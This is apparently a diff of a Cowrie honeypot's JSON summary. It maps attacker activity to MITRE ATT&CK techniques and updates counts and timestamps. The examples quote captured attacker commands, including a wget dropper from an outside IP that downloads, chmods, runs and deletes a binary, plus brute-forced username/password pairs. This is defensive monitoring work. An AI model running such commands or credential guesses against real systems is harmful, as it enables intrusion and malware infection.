@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-13 04:04:01",
+  "generated": "2026-09-13 05:02:38",
   "totals": {
-    "commands": 96,
-    "login_failed": 247,
-    "login_success": 21,
-    "sessions": 313
+    "commands": 111,
+    "login_failed": 836,
+    "login_success": 30,
+    "sessions": 1008
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 247,
+      "count": 836,
       "examples": [
         "support / 123123",
         "root / ASD@1",
@@ -21,14 +21,14 @@
         "admin / 120491"
       ],
       "first": "2026-09-13T00:01:39.551024Z",
-      "last": "2026-09-13T04:01:19.460850Z",
-      "unique_ips": 33
+      "last": "2026-09-13T05:02:35.845769Z",
+      "unique_ips": 40
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 32,
+      "count": 33,
       "examples": [
         "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; ",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
@@ -37,14 +37,14 @@
         ">/var/tmp/d && chmod 777 /var/tmp/d && /var/tmp/d && cd /var/tmp/"
       ],
       "first": "2026-09-13T01:09:07.830574Z",
-      "last": "2026-09-13T04:02:27.093913Z",
-      "unique_ips": 4
+      "last": "2026-09-13T04:09:15.125452Z",
+      "unique_ips": 5
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 21,
+      "count": 30,
       "examples": [
         "root / ",
         "ftpuser / ftpuser",
@@ -53,8 +53,8 @@
         "root / Test@2022"
       ],
       "first": "2026-09-13T00:06:04.494050Z",
-      "last": "2026-09-13T04:01:23.751663Z",
-      "unique_ips": 17
+      "last": "2026-09-13T04:59:06.288178Z",
+      "unique_ips": 22
     },
     {
       "id": "T1105",
@@ -75,54 +75,55 @@
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 4,
+      "count": 8,
       "examples": [
         "uname -s -m",
         "uname -a",
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
+        "uname -s -v -n -r -m"
       ],
       "first": "2026-09-13T01:03:11.303355Z",
-      "last": "2026-09-13T02:37:39.660670Z",
-      "unique_ips": 3
+      "last": "2026-09-13T04:22:58.664070Z",
+      "unique_ips": 6
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 3,
+      "count": 4,
       "examples": [
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
       ],
       "first": "2026-09-13T02:37:39.660670Z",
-      "last": "2026-09-13T04:01:32.728954Z",
-      "unique_ips": 3
+      "last": "2026-09-13T04:09:15.125452Z",
+      "unique_ips": 4
     },
     {
       "id": "T1059.004",
       "name": "Command and Scripting Interpreter: Unix Shell",
       "tactic": "Execution",
-      "count": 2,
+      "count": 3,
       "examples": [
         "echo 2gxJloTsO2 && cd /tmp; echo inICc0lWY0 > UPGxt9P8zD && sleep 160 &",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-09-13T01:07:42.787802Z",
-      "last": "2026-09-13T02:37:39.660670Z",
-      "unique_ips": 2
+      "last": "2026-09-13T04:09:15.125452Z",
+      "unique_ips": 3
     },
     {
       "id": "T1070.004",
       "name": "Indicator Removal: File Deletion",
       "tactic": "Defense Evasion",
-      "count": 2,
+      "count": 3,
       "examples": [
         "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; ",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-09-13T01:09:07.830574Z",
-      "last": "2026-09-13T02:37:39.660670Z",
-      "unique_ips": 2
+      "last": "2026-09-13T04:09:15.125452Z",
+      "unique_ips": 3
     },
     {
       "id": "T1083",
@@ -156,19 +157,19 @@
     ],
     [
       "system",
-      7
+      10
     ],
     [
       "shell",
-      7
+      10
     ],
     [
       "sh",
-      7
+      10
     ],
     [
       "/bin/busybox UNSTABLE",
-      5
+      8
     ],
     [
       "enable",
